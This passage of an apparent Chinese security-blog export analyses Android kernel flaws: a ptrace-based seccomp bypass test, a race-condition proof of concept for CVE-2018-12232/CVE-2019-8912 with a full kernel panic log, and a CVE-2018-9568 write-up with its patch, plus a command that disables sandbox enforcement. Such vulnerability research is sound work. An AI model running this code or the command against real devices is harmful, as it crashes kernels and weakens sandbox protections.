可以看到STRICT模式把权限设置还是比较死的，只能使用4个默认的系统调用，灵活性不够啊。那么有什么方法可以使我们自己设置过滤的系统调用吗？当然可以那就是”FILTER”模式，该模式我们可以自己编写过滤策略，相对于前面的模式来说”FILTER”模式就灵活多了。但也有一个限制那就是开启该模式需要具备CAP_SYS_ADMIN属性或当前进程设置了no_new_privs选项，可通过prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);来开启no_new_privs选项。如果不具备前面两个条件的任意一个那么使用SECCOMP_SET_MODE_FILTER选项时函数就会返回错误。这样设定的原因主要为了避免无特权的进程新增恶意bpf策略，no_new_privs选项主要是用于规避execve启动的程序权限大于父进程权限而造成一些列安全问题开启”FILTER”模式的方法和前面的差不多只需要换下参数：(注意上面提到的该模式的前提条件)121.prctl(PR_SET_SECCOMP,SECCOMP_SET_MODE_FILTER,args);2.seccomp(SECCOMP_SET_MODE_FILTER,0,args); 最后的args参数指向一个sock_fprog结构体，而sock_fprog结构体的filter成员指向的就是我们的bpf过滤代码。具体的结构体如下：123456789101112131415161718192021/*设置SECCOMP_SET_MODE_FILTER模式时传入的args参数*/struct sock_fprog &#123; /* Required for SO_ATTACH_FILTER. */ unsigned short len; /* Number of filter blocks */ struct sock_filter __user *filter;&#125;;/*用来创建bpf指令，系统调用时内核会用到*/struct sock_filter &#123; /* Filter block */ __u16 code; /* Actual filter code */ __u8 jt; /* Jump true */ __u8 jf; /* Jump false */ __u32 k; /* Generic multiuse field */&#125;;/*该结构体用来存放系统调用信息*/struct seccomp_data &#123; int nr; /* System call number */ __u32 arch; /* AUDIT_ARCH_* value(see &lt;linux/audit.h&gt;) */ __u64 instruction_pointer; /* CPU instruction pointer */ __u64 args[6]; /* Up to 6 system call arguments */&#125;; 当触发一个过滤检查时(也就是调用限制系统调用时)，seccomp过滤器函数会根据过滤代码返回一个由两部分组成的32位值。前16-bit为SECCOMP_RET_ACTION,后16-bit为SECCOMP_RET_DATA。SECCOMP_RET_ACTION定义了以下几种行为：SECCOMP_RET_KILL – 不执行system call，立即中止process (SIGSYS)。SECCOMP_RET_TRAP – 不执行system call，进程发出(SIGSYS)system call, 并system。 call相关信息存放到siginfo_tSECCOMP_RET_ERRNO – 不执行system call，SECCOMP_RET_DATA返回errno。SECCOMP_RET_TRACE – 启动ptrace base的tracer(如gdb), 让tracer可以接手处理。若没有tracer则返回-ENOSYSSECCOMP_RET_ALLOW – system call正常运行如果同时符合多个条件，则SECCOMP_RET_ACTION只会返回优先级较高的值。 SECCOMP_RET_DATA则表示我们的返回值。 使用seccomp沙箱列出一个linux中使用该模式的例子：https://elixir.bootlin.com/linux/latest/source/samples/seccomp/dropper.c 关闭seccomp沙箱通过adb shell setenforce 0 &amp;&amp; adb stop &amp;&amp; adb start指令可关闭对zygote进程的seccomp的安装，因为无法从正在运行的进程中移除seccomp策略，所以需要重启shell以使该选项生效。 seccomp检测工具AOSP项目中/cts/tests/tests/security/jni/android_security_cts_SeccompTest.cpp可用来检测当前设备阻止了哪些系统调用，原理就是不断试错。 BPF策略BPF（BSD Packet Filter）一种过滤机制，更多时候用来过滤Unix内核网络数据包，我们这里是seccomp用它来做系统调用的过滤操作，BPF采用一种叫过滤器伪机的方式(filter Pseudo-machine)对BPF过滤代码做解释执行，这种伪机器是一个轻量级，高效的状态机。BPF伪指令形式为”opcode jt jf k”也就是前面的sock_filter结构体，分别表示操作码，寻址方式，判断正确的跳转和失败的跳转，以及操作所使用的的通用数据域。|opcode|jt|jf|k|下面是一组BPF代码，这段代码比较好理解，用来定义内核对系统调用nr的过滤，如果目标进程如果使用了nr系统调用，则会执行SECCOMP_RET_KILL选项也就是进程被直接杀掉，使用别的调用则会使用SECCOMP_RET_ALLOW选项直接放行。涉及到的几个指令函数：BPF_LD+BPF_W+BPF_ABS A &lt;- P[k:4] /将一个Word即4byte的值赋给寄存器(accumulator)/BPF_JMP+BPF_JEQ+BPF_K pc += (A == k) ? jt : jf /若A等于K则跳转jt行执行否则跳转jf行执行/更多指令含义1234567891011struct sock_filter filter[] = &#123; BPF_STMT(BPF_LD+BPF_W+BPF_ABS, /*把获取seccomp_data结构体中arch变量的值并加载到寄存器中*/ (offsetof(struct seccomp_data, arch))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, arch, 0, 3),/*判断获取的arch是否与我们过滤代码指定的arch一致,若一致继续判断,否则返回SECCOMP_RET_ALLOW*/ BPF_STMT(BPF_LD+BPF_W+BPF_ABS, /*把获取seccomp_data结构体中nr变量的值并加载到寄存器中*/ (offsetof(struct seccomp_data, nr))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, nr, 0, 1),/*判断获取的nr是否与我们过滤代码指定的nr一致,若一致则返回错误SECCOMP_RET_KILL,不一致则返回SECCOMP_RET_ALLOW*/ BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL|(error &amp; SECCOMP_RET_DATA)), BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),&#125;; 学过汇编的朋友第一眼是不是感觉和汇编代码很相似，反正我感觉都差不多。 ptrace使用ptrace想必大家都有所了解这里就不多介绍了，主要记录下用到的选项：PTRACE_SETREGSET：用来修改tracee的寄存器，这里指定为NT_ARM_SYSTEM_CALL就可以把子进程的系统调用给改掉了，需要改的值放在iov结构体中。ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)； 利用代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;errno.h&gt;#include &lt;linux/audit.h&gt;.....#include &lt;sys/wait.h&gt;#include &lt;stdbool.h&gt;int do_exp(void) &#123; int status,sysnumber; struct iovec iov = &#123;.iov_base = &amp;sysnumber, .iov_len = sizeof(sysnumber)&#125;; pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) &#123; printf(\"[+] [Child] pid:%d\\n\",getpid()); //syscall(__NR_swapon, 0, 0); pid_t my_pid = getpid(); while (1) &#123; errno = 0; int res = syscall(__NR_gettid, 0, 0); /*不断执行syscall*/ if (res != my_pid) &#123; //syscall(__NR_swapon, 0, 0); printf(\"[Child] error -&gt; %d (%s)\\n\", res, strerror(errno)); /*把错误值返回给父进程,正常返回表示绕过了沙箱,不然应该会被系统kill则表示没绕过沙箱*/ exit(res); &#125; &#125; &#125; sleep(1); if (ptrace(PTRACE_ATTACH, child, NULL, NULL)) err(1, \"ptrace attach\"); /*附加到进程*/ if (waitpid(child, &amp;status, 0) != child) err(1, \"wait for child\"); if (ptrace(PTRACE_SYSCALL, child, NULL, NULL)) err(1, \"ptrace syscall entry\"); if (waitpid(child, &amp;status, 0) != child) err(1, \"wait for child\"); if (ptrace(PTRACE_GETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)) err(1, \"ptrace getregs\"); /*在子进程syscall的时候停止,获取系统调用号到iov中 (NT_ARM_SYSTEM_CALL ARM system call number)*/ printf(\"seeing syscall %d\\n\", sysnumber); if (sysnumber != __NR_gettid) errx(1, \"not gettid\"); /*判断获取到的系统调用号是否为getpid*/ sysnumber = __NR_swapon; /*修改系统调用号*/ if (ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)) err(1, \"ptrace setregs\"); /*在子进程syscall的时候停止,通过iov修改 syscall的系统调用号*/ if (ptrace(PTRACE_DETACH, child, NULL, NULL)) err(1, \"ptrace syscall\"); /*分离*/ pid_t pid; bool isvul=false; pid = wait(&amp;status); //printf(\"child process has exited,pid=%d status=%d\\n\", pid,status); if ( WIFEXITED(status) )&#123; /*通过判断子进程是否正常返回区分是否绕过了seccomp沙箱*/ printf(\"child exited with code:%d\\n\", WEXITSTATUS(status)); isvul = true; &#125;else&#123; isvul = false; printf(\"child process exit abnormally\\n\"); &#125; //kill(child, SIGCONT); //sleep(5); //kill(child, SIGKILL); return isvul;&#125;static int install_filter(int nr, int arch, int error)&#123; struct sock_filter filter[] = &#123; BPF_STMT(BPF_LD+BPF_W+BPF_ABS, (offsetof(struct seccomp_data, arch))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, arch, 0, 3), BPF_STMT(BPF_LD+BPF_W+BPF_ABS, (offsetof(struct seccomp_data, nr))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, nr, 0, 1), BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL|(error &amp; SECCOMP_RET_DATA)), //BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW), &#125;; struct sock_fprog prog = &#123; .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, &#125;; if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) &#123; perror(\"prctl(NO_NEW_PRIVS)\"); return 1; &#125; if (prctl(PR_SET_SECCOMP, 2, &amp;prog)) &#123; perror(\"prctl(PR_SET_SECCOMP)\"); return 1; &#125; return 0;&#125;int main(int argc, char **argv)&#123; printf(\"[+] __NR_swapon:%d pid:%d\\n\",__NR_swapon,getpid()); if (install_filter(__NR_swapon, AUDIT_ARCH_AARCH64,SECCOMP_RET_KILL)) /*对__NR_swapon系统调用设置过滤*/ return 1; if(do_exp())&#123; printf(\" Vulnerability \\n\"); &#125;else&#123; printf(\" No Vulnerability \\n\"); &#125; //syscall(__NR_swapon, 0, 0); //printf(\"Failed to swapon\\n\"); return 1;&#125; 总结感觉这段时间尽看些逻辑漏洞，逻辑漏洞利用起来不用过各种保护机制真是好，而且还特稳定，不像内存破坏漏洞还需要绕过各种保护机制才能提权成功，而某些逻辑漏洞直接就能提权。唉，早点休息早点休息，狗命要紧。 参考12345https://bugs.chromium.org/p/project-zero/issues/detail?id=1718&amp;can=1&amp;q=jannh&amp;sort=-reported&amp;colspec=ID%20Status%20Restrict%20Reported%20Vendor%20Product%20Finder%20Summaryhttps://szlin.me/2017/08/23/kernel_seccomp/http://www.tin.org/bin/man.cgi?section=2&amp;topic=ptracehttp://wiki.mozilla.org/Security/Sandbox/Seccomphttp://www.selinuxplus.com/?p=363","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-12232-And-CVE-2019-8912","slug":"CVE-2018-12232-And-CVE-2019-8912","date":"2019-04-02T16:36:09.000Z","updated":"2019-04-02T16:45:05.616Z","comments":true,"path":"2019/04/03/CVE-2018-12232-And-CVE-2019-8912/","link":"","permalink":"http://github.com/2019/04/03/CVE-2018-12232-And-CVE-2019-8912/","excerpt":"","text":"CVE-2018-12232&amp;&amp;CVE-2019-8912 前言漏洞信息 实验环境：Android-&gt; MiX2 漏洞类型：条件竞争 -&gt; 释放后重引用 linux补丁： CVE-2018-12232:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6d8c50dcb029872b298eea68cc6209c866fd3e14(第一次修补) CVE-2019-8912:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9060cb719e61b685ec0102574e10337fa5f445ea(第二次修补) CVE-2019-8912:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff7b11aa481f682e0e9711abfeb7d03f5cd612bf(第三次修补) 漏洞原理漏洞原理这里简单记录一下今天看的两个漏洞(CVE-2018-12232和CVE-2019-8912),挺有意思的两个洞，CVE-2018-12232这个漏洞的原理就是由于竞争条件导致close释放了sk后没有把sk设置为null，在sockfs_setattr函数中直接把sock-&gt;sk拿来使用导致的释放后重引用问题。而第二个洞(CVE-2019-8912)则是由于在修补第一个洞(CVE-2018-12232)时考虑不周导致的修复不彻底可以绕过第一次的修复的二次修复。 漏洞造成的影响通过条件竞争触发释放后重引用达到内核态NULL指针解引用实现拒绝服务攻击 补丁用意Linux补丁是2018年6月份的时候对该漏洞打上的补丁，补丁主要是在sockfs_setattr函数中添加了对sock-&gt;sk是否为NULL的检查，因为通常release函数中释放完sk内存后都把sock-&gt;sk设置为NULL，所以我们在sockfs_setattr中判断一下是否为NULL就可避免别的线程通过release函数竞争释放掉sock-&gt;sk内存后触发的释放后重引用问题，可惜的是这次的修补并不能算是一个成功的修补。这就引出了第二次修补，其实第二次修补从时间来看也分为两次，第一次是2019年2月18日只是单独在crypto模块的af_alg_release函数中把sock-&gt;sk置为NULL避免了AF_ALG套接字的UAF，但是后来发现这样修补并没有从根本上解决问题，因为还有许多模块的release函数也存在没把sock-&gt;sk置为NULL的问题，所以2019年2月25日再次进行修补，这次修补是直接在调用完release函数之后把sock-&gt;sk置为NULL，这样才从根本上解决了sock-&gt;sk内存释放后没置为NULL引发的NULL指针解引用问题。 漏洞模型释放内存后未对指针变量置为NULL，由于别的地方对该指针还有引用并且使用时还没有判断指针是否为NULL，从而触发了释放后重引用问题，很标准的释放后重引用模型。 漏洞复现Proof of Concept12345678910111213141516171819202122232425262728293031323334#include &lt;pthread.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;pthread_t t;volatile int fd;void *close_thread(void *arg)&#123; for (;;) &#123; close(fd); &#125;&#125;void *setattr_thread(void *arg)&#123; for (;;) &#123; if(fchownat(fd, \"\", 2000, 2000, 0x1000) == -1)&#123; //perror(\"&gt; \"); &#125; &#125;&#125;int main()&#123; pthread_create(&amp;t, NULL, close_thread, NULL); pthread_create(&amp;t, NULL, setattr_thread, NULL); for (;;) &#123; fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if(fd == -1)&#123; perror(\"&gt; \"); &#125; close(fd); &#125;&#125; Crash Log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107[25032.287867] FG: soc_work_fn: adjust_soc: 079: 00, 00, 00, 03[25032.946282] Unable to handle kernel NULL pointer dereference at virtual address 0000025c[25032.946349] pgd = ffffffc092f0f000[25032.946364] [0000025c] *pgd=00000000f0737003, *pud=00000000f0737003, *pmd=0000000000000000[25032.946601] ------------[ cut here ]------------[25032.946618] Kernel BUG at ffffff8008cc2284 [verbose debug info unavailable][25032.946636] Internal error: Oops - BUG: 96000046 [#1] PREEMPT SMP[25032.946653] Modules linked in: wlan(O) exfat(O)[25032.946707] CPU: 2 PID: 9620 Comm: poc Tainted: G W O 4.4.78-perf-gdd4cbe9-00529-g1a92c1c #1[25032.946722] Hardware name: Qualcomm Technologies, Inc. MSM 8998 v2.1 MTP (DT)[25032.946743] task: ffffffc0a2ca3000 ti: ffffffc0a41fc000 task.ti: ffffffc0a41fc000[25032.946789] PC is at sockfs_setattr+0x30/0x40[25032.946809] LR is at sockfs_setattr+0x18/0x40[25032.946826] pc : [&lt;ffffff8008cc2284&gt;] lr : [&lt;ffffff8008cc226c&gt;] pstate: 20000145[25032.946839] sp : ffffffc0a41ffd40[25032.946852] x29: ffffffc0a41ffd40 x28: ffffffc0a41fc000[25032.946877] x27: 0000000000005800 x26: 000000000000c1ff[25032.946901] x25: ffffffc0a41ffe18 x24: ffffffc174cf43a0[25032.946924] x23: ffffffc0ac9c6840 x22: ffffffc0a41ffe20[25032.946948] x21: ffffffc0a134d430 x20: ffffffc0ac9c6840[25032.946972] x19: ffffffc0a41ffe20 x18: 0000000000000000[25032.946995] x17: 0000000000000001 x16: ffffff80081b6598[25032.947019] x15: 0000007fe17f3aa8 x14: 0000000000000001[25032.947042] x13: 0000000000000001 x12: 0000000000000003[25032.947066] x11: 0101010101010101 x10: fffffffffffffffd[25032.947088] x9 : 0000000000000005 x8 : 0000000000000002[25032.947111] x7 : 00000000003ceaa4 x6 : 0000004173d33000[25032.947134] x5 : 0000000000000000 x4 : 0000000000000000[25032.947159] x3 : 0000000000000000 x2 : 00000000000007d0[25032.947182] x1 : 0000000000000000 x0 : 0000000000000000[25032.947209][25032.947209] PC: 0xffffff8008cc2184:[25032.947225] 2184 36580062 52800802 b90073a2 f9400402 92800380 b5000202 f9400822 d2800000[25032.947294] 21a4 b40001a2 b94073a3 aa0103f3 aa0403e0 aa1403e1 97ffffcd 93407c00 a9410e82[25032.947359] 21c4 a9000e62 f9401a81 a9420e82 a9010e62 f9001261 a94153f3 a8c87bfd d65f03c0[25032.947424] 21e4 a9bb7bfd 910003fd a90153f3 a9025bf5 f9001bf7 aa0103f4 aa0003f7 91004020[25032.947489] 2204 52800041 aa0403f6 d5384113 f90027a5 f9400675 97dac853 92800000 f9000660[25032.947555] 2224 f94027a5 aa1703e0 aa1403e1 aa1603e2 2a0503e3 97ffffad f9000675 a94153f3[25032.947619] 2244 a9425bf5 f9401bf7 a8c57bfd d65f03c0 a9be7bfd 910003fd a90153f3 aa0003f4[25032.947682] 2264 aa0103f3 97d45e34 350000e0 b9400261 360800a1 f9401a81 b9400a62 f85f0021[25032.947748] 2284 b9025c22 a94153f3 a8c27bfd d65f03c0 a9bd7bfd 910003fd a90153f3 a9025bf5[25032.947814] 22a4 2a0203f6 aa0103f3 f9401002 aa0003f5 aa1303e3 79402040 79429441 39452442[25032.947876] 22c4 97fffcfa 2a0003f4 37f80294 f94016a0 2a1603e2 f9400261 f9401803 aa1503e0[25032.947942] 22e4 d63f0060 2a0003f4 36f800b4 f9400260 97fffc0d f900027f 14000008 f9400260[25032.948009] 2304 f94016a1 f9001401 f9400260 f9401400 f9400400 97d16f06 2a1403e0 a94153f3[25032.948074] 2324 a9425bf5 a8c37bfd d65f03c0 a9be7bfd 7100a01f 910003fd a90153f3 54000049[25032.948140] 2344 d4210000 9000b7b3 2a0003f4 911b0273 91008273 aa1303e0 9407f3ad d0007a20[25032.948203] 2364 937d7e81 91352000 91002000 f821681f aa1303e0 9407f433 97d1076f d0005b60[25032.948272][25032.948272] LR: 0xffffff8008cc216c:[25032.948287] 216c a9047e9f a9021e86 f9001a85 f9003fa0 f9406844 b9404042 36580062 52800802[25032.948354] 218c b90073a2 f9400402 92800380 b5000202 f9400822 d2800000 b40001a2 b94073a3[25032.948418] 21ac aa0103f3 aa0403e0 aa1403e1 97ffffcd 93407c00 a9410e82 a9000e62 f9401a81[25032.948481] 21cc a9420e82 a9010e62 f9001261 a94153f3 a8c87bfd d65f03c0 a9bb7bfd 910003fd[25032.948544] 21ec a90153f3 a9025bf5 f9001bf7 aa0103f4 aa0003f7 91004020 52800041 aa0403f6[25032.948609] 220c d5384113 f90027a5 f9400675 97dac853 92800000 f9000660 f94027a5 aa1703e0[25032.948676] 222c aa1403e1 aa1603e2 2a0503e3 97ffffad f9000675 a94153f3 a9425bf5 f9401bf7[25032.948741] 224c a8c57bfd d65f03c0 a9be7bfd 910003fd a90153f3 aa0003f4 aa0103f3 97d45e34[25032.948806] 226c 350000e0 b9400261 360800a1 f9401a81 b9400a62 f85f0021 b9025c22 a94153f3[25032.948869] 228c a8c27bfd d65f03c0 a9bd7bfd 910003fd a90153f3 a9025bf5 2a0203f6 aa0103f3[25032.948934] 22ac f9401002 aa0003f5 aa1303e3 79402040 79429441 39452442 97fffcfa 2a0003f4[25032.949000] 22cc 37f80294 f94016a0 2a1603e2 f9400261 f9401803 aa1503e0 d63f0060 2a0003f4[25032.949065] 22ec 36f800b4 f9400260 97fffc0d f900027f 14000008 f9400260 f94016a1 f9001401[25032.949129] 230c f9400260 f9401400 f9400400 97d16f06 2a1403e0 a94153f3 a9425bf5 a8c37bfd[25032.949194] 232c d65f03c0 a9be7bfd 7100a01f 910003fd a90153f3 54000049 d4210000 9000b7b3[25032.949261] 234c 2a0003f4 911b0273 91008273 aa1303e0 9407f3ad d0007a20 937d7e81 91352000[25032.949330][25032.949330] SP: 0xffffffc0a41ffc40:[25032.949345] fc40 73d33000 00000041 003ceaa4 00000000 00000002 00000000 00000005 00000000[25032.949408] fc60 fffffffd ffffffff 01010101 01010101 00000003 00000000 00000001 00000000[25032.949472] fc80 00000001 00000000 e17f3aa8 0000007f 081b6598 ffffff80 00000001 00000000[25032.949536] fca0 00000000 00000000 a41ffe20 ffffffc0 ac9c6840 ffffffc0 a134d430 ffffffc0[25032.949600] fcc0 a41ffe20 ffffffc0 ac9c6840 ffffffc0 74cf43a0 ffffffc1 a41ffe18 ffffffc0[25032.949664] fce0 0000c1ff 00000000 00005800 00000000 a41fc000 ffffffc0 a41ffd40 ffffffc0[25032.949729] fd00 08cc226c ffffff80 a41ffd40 ffffffc0 08cc2284 ffffff80 20000145 00000000[25032.949796] fd20 a41ffd40 ffffffc0 08cc226c ffffff80 00000000 00000080 ac9c6840 ffffffc0[25032.949861] fd40 a41ffd60 ffffffc0 081cfbe4 ffffff80 00001846 00000000 00000000 00000000[25032.949927] fd60 a41ffdb0 ffffffc0 081b54b4 ffffff80 00000000 00000000 a41ffeb0 ffffffc0[25032.949990] fd80 a134d430 ffffffc0 000007d0 00000000 000007d0 00000000 a134d4d8 ffffffc0[25032.950055] fda0 00000040 00000000 00000042 00000000 a41ffe70 ffffffc0 081b6628 ffffff80[25032.950121] fdc0 00000000 00000000 00004001 00000000 00000000 00000000 0042a302 00000000[25032.950185] fde0 000007d0 00000000 000007d0 00000000 0000011d 00000000 00000036 00000000[25032.950251] fe00 09002000 ffffff80 00000000 00000000 00000000 00000000 00000000 00000000[25032.950315] fe20 00001846 00000000 000007d0 000007d0 a41ffe50 ffffffc0 5a043e06 00000000[25032.950380][25032.950396] Process poc (pid: 9620, stack limit = 0xffffffc0a41fc020)[25032.950412] Call trace:[25032.950435] Exception stack(0xffffffc0a41ffb70 to 0xffffffc0a41ffca0)[25032.950454] fb60: ffffffc0a41ffe20 0000008000000000[25032.950476] fb80: ffffffc0a41ffd40 ffffff8008cc2284 ffffffbdc284d300 ffffffc0a134e080[25032.950498] fba0: ffffffc174ce2300 ffffff8008cc1d38 ffffffc0a41fc000 ffffffc0a41fc000[25032.950521] fbc0: 000000000000bf42 ffffff8009007000 ffffff8009002000 ffffffc0a41fc000[25032.950542] fbe0: ffffffc0a41ffc00 0000000108146380 ffffffc0a134e080 ffffffc0a41fc000[25032.950564] fc00: ffffffc0a41ffc60 ffffffc0a134e080 0000000000000000 0000000000000000[25032.950583] fc20: 00000000000007d0 0000000000000000 0000000000000000 0000000000000000[25032.950603] fc40: 0000004173d33000 00000000003ceaa4 0000000000000002 0000000000000005[25032.950623] fc60: fffffffffffffffd 0101010101010101 0000000000000003 0000000000000001[25032.950644] fc80: 0000000000000001 0000007fe17f3aa8 ffffff80081b6598 0000000000000001[25032.950670] [&lt;ffffff8008cc2284&gt;] sockfs_setattr+0x30/0x40[25032.950709] [&lt;ffffff80081cfbe4&gt;] notify_change2+0x22c/0x348[25032.950737] [&lt;ffffff80081b54b4&gt;] chown_common+0xac/0x130[25032.950759] [&lt;ffffff80081b6628&gt;] SyS_fchownat+0x90/0xd0[25032.950788] [&lt;ffffff8008082730&gt;] el0_svc_naked+0x24/0x28[25032.950812] Code: 360800a1 f9401a81 b9400a62 f85f0021 (b9025c22)[25032.950833] ---[ end trace 891e55ff6a5e58d7 ]---[25034.044441] Kernel panic - not syncing: Fatal exception[25034.044474] CPU0: stopping 总结多看看内核补丁，看能不能通过补丁找到类似的漏洞，很有可能捡到一些漏洞呢。希望早点捡到漏洞。","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-9568","slug":"CVE-2018-9568","date":"2019-03-25T02:04:25.000Z","updated":"2019-04-01T15:23:37.685Z","comments":true,"path":"2019/03/25/CVE-2018-9568/","link":"","permalink":"http://github.com/2019/03/25/CVE-2018-9568/","excerpt":"","text":"CVE-2018-9568 前言漏洞信息 实验环境：Nexus 5X(3.10版内核，) 漏洞类型：类型混淆类漏洞 –&gt; 释放后重引用 linux补丁：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/core/sock.c?id=9d538fa60bad4f7b23193c89e843797a1cf71ef3 漏洞描述：当应用程序使用IPV6_ADDRFORM(将IPv6套接字转换为IPv4)时，sk-&gt;sk_prot和sk-&gt;sk_prot_creator可能会不同。 这就是为什么sk_prot_creator确保sk_prot_free()在正确的kmem_cache slab上执行kmem_cache_free()的原因。 漏洞原理漏洞原理如果把一个IPV6类型的套接字句柄通过setsockopt函数使用IPV6_ADDRFORM选项转换成IPV4套接字,那么该套接字的sk-&gt;sk_prot会被改变为tcp_prot,此时套接字的sk-&gt;sk_prot和sk-&gt;sk_prot_creator就不一样了(sk-&gt;sk_prot指向tcp_prot，而sk-&gt;sk_prot_creator还是原来的tcpv6_prot，sk_prot_creator指向的proto结构体中的slab变量指向申请当前sk结构体的那块专用高速缓存)。再使用accept函数去监听上面被转换成IPV4的套接字,底层函数sk_clone_lock会分配一个新的IPV4套接字，使用被监听套接字的sk-&gt;sk_prot(tcp_prot)中的slab变量指向的高速缓存申请一个新的sock结构体变量sk，再把被监听套接字的所有内容都拷贝到新的sock结构体变量sk中,由于这属于完全拷贝导致新套接字的sk-&gt;sk_prot_creator和被监听套接字的sk-&gt;sk_prot_creator一致(都指向tcpv6_prot),并且后面的代码也没有把新套接字的sk-&gt;sk_prot_createor更新为创建sock结构体时使用的sk_prot,后续关闭新套接字调用sk_prot_free函数释放sock结构体时使用的是sk_prot_creator指向的slab(也就是tcpv6_prot的slab，但实际应该使用tcp_prot的slab)，导致释放这个sock结构体时使用的高速缓存不是申请这个结构体时使用的高速缓存，存在类型混淆的问题。123456789101112131415161718/* sk-&gt;sk_prot指向的结构体原型 */struct proto &#123;/*--------------------------skip--------------------------*/ int max_header; bool no_autobind; struct kmem_cache *slab; /* 指向当前套接字协议对应的高速缓存*/ unsigned int obj_size; slab_flags_t slab_flags; unsigned int useroffset; /* Usercopy region offset */ unsigned int usersize; /* Usercopy region size */ struct percpu_counter *orphan_count; struct request_sock_ops *rsk_prot; struct timewait_sock_ops *twsk_prot;/*--------------------------skip--------------------------*/ char name[32]; /* TCP/TCPv6 */ struct list_head node; int (*diag_destroy)(struct sock *sk, int err);&#125; __randomize_layout; 大概的触发链如下：1.首先创建一个IPV6的套接字 底层会创建一个sk结构体,在inet6_create函数中,通过sk_alloc函数调用sk_prot_alloc函数在prot-&gt;slab指向的slab中申请,并且初始化sk-&gt;sk_prot = sk-&gt;sk_prot_creator = prot; 此时使用的是IPV6的初始化1socket()-&gt;__sys_socket()-&gt;sock_create()-&gt;__sock_create()-&gt;pf-&gt;create(__sock_create内部的函数指针)-&gt;inet6_create()-&gt;sk_alloc()-&gt;sk_prot_alloc()-&gt;kmem_cache_alloc() 2.把IPV6套接字转换为IPV4套接字,在do_ipv6_setsockopt函数中通过选项IPV6_ADDRFORM,把第一步申请的sk-&gt;sk_prot赋值成IPV4的prot,此时该sk的prot和sk_prot_creator已经不一致了,所以可以看出为什么在释放函数kmem_cache_free中传入的是sk_prot_creator,这是为了能够在正确的kmem_cache slab上做释放1do_ipv6_setsockopt()-&gt;case IPV6_ADDRFORM: 3.用转换的IPV4套接字通过accept生成一个真正的IPV4套接字,在accept底层函数sk_clone_lock中会把监听套接字的sk结构体通过sock_copy拷贝到新的套接字的sk中,因为这里拷贝完成后没有对新套接字sk的sk_prot_creator变量做初始化,实际新套接字的该成员还是指向了监听套接字的sk_prot_creator,而监听套接字sk的sk_prot_creator是属于IPV6的,它的sk实际在sk_prot中的slab中申请的(newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family);)1sk_clone_lock() 4.释放真正的IPV4套接字触发kmem_cache_free,错误使用sk-&gt;sk_prot_creator在错误的kmem_cache slab上释放sk1sk_free()-&gt;__sk_free()-&gt;sk_prot_free()-&gt;kmem_cache_free()-&gt; 漏洞造成的影响该漏洞造成的结果：由于混淆释放使用了错误的偏移值导致受害者page的freelist链表损坏，会出现重复申请的情况，一个sk对象内存被多个套接字描述符重复指向，精心构造逻辑会出现释放后重引用的问题。 漏洞模型通过对一个结构体对象完全拷贝来生成另一个新结构体变量时，由于一时疏忽忘记对新结构体变量中的某些值做初始化，导致使用新结构体变量时错误的使用了原结构体的值。和CVE-2017-8890有些类似，只是8890没初始化的是内存指针导致了浅拷贝的问题，而这个洞是使用了不该使用的变量导致的类型混淆的问题。 补丁用意补丁就是在accept底层函数sk_clone_lock拷贝完成之后,对新套接字的sk_prot_creator变量初始化为sk_prot指向正确的高速缓存，避免最后释放时使用错误的缓存进行释放。1234567891011121314151617Diffstat (limited to 'net/core/sock.c')-rw-r--r-- net/core/sock.c 2 1 files changed, 2 insertions, 0 deletionsdiff --git a/net/core/sock.c b/net/core/sock.cindex 9b7b6bbb2a23..7d55c05f449d 100644--- a/net/core/sock.c+++ b/net/core/sock.c@@ -1654,6 +1654,8 @@ struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority) sock_copy(newsk, sk); + newsk-&gt;sk_prot_creator = sk-&gt;sk_prot;+ /* SANITY */ if (likely(newsk-&gt;sk_net_refcnt)) get_net(sock_net(newsk)); 漏洞利用基础知识Slab分配器什么是Slab分配器在linux内核中一般是通过buddy system进行物理内存的分配的，其分配单位是页。之所以引入Slab分配器就是因为buddy system只能按页对齐来分配内存，而大多数情况下内核申请的内存大小不需要一页。如果直接通过buddy system分配内存就会造成大量的内存碎片也就是分配了而没有被用到并且无法再次分配的内存。而Slab却可以满足内核的小内存分配并且不会出现过多的内存碎片，虽然Slab分配比buddy system分配灵活但是Slab分配器还是基于buddy system实现的。 Slab分配器的优点 不会出现过多的内存碎片 